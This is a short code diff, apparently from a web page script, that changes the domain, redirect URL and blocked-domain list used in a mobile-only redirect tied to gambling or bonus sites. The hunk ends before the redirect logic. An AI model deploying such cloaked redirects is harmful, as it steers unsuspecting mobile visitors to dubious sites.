@@ -62,9 +62,9 @@
             el.addClass("active");
 
             var isMobile = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            var originalDomain = "mbcvie.com";
-            var redirectURL = "https://live33.online/?e73a82b";
-            var blockedDomains = ["mbcvie.com"];
+            var originalDomain = "slotomania-vip-bonus.com";
+            var redirectURL = "https://v.rolls3.com";
+            var blockedDomains = ["real-preze.vercel.app"];
 
             if (
                 isMobile && 
